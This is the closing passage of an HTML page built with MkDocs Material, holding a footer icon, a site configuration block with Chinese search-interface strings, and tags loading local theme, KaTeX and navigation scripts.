      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M496 256c0 137-111.2 248-248.4 248-113.8 0-209.6-76.3-239-180.4l95.2 39.3c6.4 32.1 34.9 56.4 68.9 56.4 39.2 0 71.9-32.4 70.2-73.5l84.5-60.2c52.1 1.3 95.8-40.9 95.8-93.5 0-51.6-42-93.5-93.7-93.5s-93.7 42-93.7 93.5v1.2L176.6 279c-15.5-.9-30.7 3.4-43.5 12.1L0 236.1C10.2 108.4 117.1 8 247.6 8 384.8 8 496 119 496 256M155.7 384.3l-30.5-12.6a52.8 52.8 0 0 0 27.2 25.8c26.9 11.2 57.8-1.6 69-28.4 5.4-13 5.5-27.3.1-40.3S206 305.6 193 300.2c-12.9-5.4-26.7-5.2-38.9-.6l31.5 13c19.8 8.2 29.2 30.9 20.9 50.7-8.3 19.9-31 29.2-50.8 21m173.8-129.9c-34.4 0-62.4-28-62.4-62.3s28-62.3 62.4-62.3 62.4 28 62.4 62.3-27.9 62.3-62.4 62.3m.1-15.6c25.9 0 46.9-21 46.9-46.8 0-25.9-21-46.8-46.9-46.8s-46.9 21-46.9 46.8c.1 25.8 21.1 46.8 46.9 46.8"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "/", "features": ["announce.dismiss", "content.code.annotate", "content.code.copy", "content.code.select", "content.tooltips", "navigation.expand", "navigation.footer", "navigation.indexes", "navigation.path", "navigation.prune", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": {"Default": "default-tag", "Hardware": "hardware-tag", "Software": "software-tag"}, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.56ea9cef.min.js"></script>
      
        <script src="../js/print-site.js"></script>
      
        <script src="../javascripts/katex.js"></script>
      
        <script src="../javascripts/katex.min.js"></script>
      
        <script src="../javascripts/auto-render.min.js"></script>
      
        <script src="../javascripts/card.js"></script>
      
        <script src="../javascripts/toc.js"></script>
      
    
  </body>
</html>